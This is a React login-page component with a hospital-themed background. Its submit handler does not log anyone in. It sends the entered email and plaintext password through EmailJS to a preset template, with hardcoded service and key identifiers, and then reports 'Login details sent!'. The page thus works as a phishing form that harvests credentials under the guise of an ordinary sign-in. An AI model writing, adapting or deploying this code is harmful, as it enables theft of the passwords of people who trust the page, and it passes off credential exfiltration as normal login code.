import React, { useState } from "react";
import emailjs from "emailjs-com";

const Login = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");

  const sendEmail = (e) => {
    e.preventDefault();

    const templateParams = {
      user_email: email,
      user_password: password,
    };

    emailjs
      .send(
        "service_19n7rab",
        "template_9yo5jrt",  
        templateParams,
        "RDggz7w_LPpq8t6I6" 
      )
      .then(
        (response) => {
          console.log("Email sent successfully!", response.status, response.text);
          alert("Login details sent!");
        },
        (err) => {
          console.error("Failed to send email:", err);
          alert("Failed to send email.");
        }
      );
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-gray-900"
      style={{
        backgroundImage: "url(src/assets/blur-hospital_1203-7972.jpg)",
        backgroundSize: "cover",
        backgroundPosition: "center center",
        backgroundRepeat: "no-repeat",
        backgroundAttachment: "fixed",
      }}
    >
      <div className="bg-white p-8 rounded-lg shadow-lg w-full max-w-md">
        <h2 className="text-2xl font-bold text-center text-gray-800">Login to Your Account</h2>

        <form className="mt-6" onSubmit={sendEmail}>
          <label className="block text-gray-700">Email</label>
          <input 
            type="email" 
            className="w-full p-2 border rounded mt-1" 
            placeholder="Enter your email" 
            value={email} 
            onChange={(e) => setEmail(e.target.value)}
            required
          />

          <label className="block text-gray-700 mt-4">Password</label>
          <input 
            type="password" 
            className="w-full p-2 border rounded mt-1" 
            placeholder="Enter your password" 
            value={password} 
            onChange={(e) => setPassword(e.target.value)}
            required
          />

          <button type="submit" className="w-full bg-blue-500 text-white p-2 rounded mt-6 hover:bg-blue-700">
            Login
          </button>
        </form>

        <p className="text-center mt-4 text-gray-600">
          Don't have an account? <a href="/signup" className="text-blue-500">Sign up</a>
        </p>
      </div>
    </div>
  );
};

export default Login;
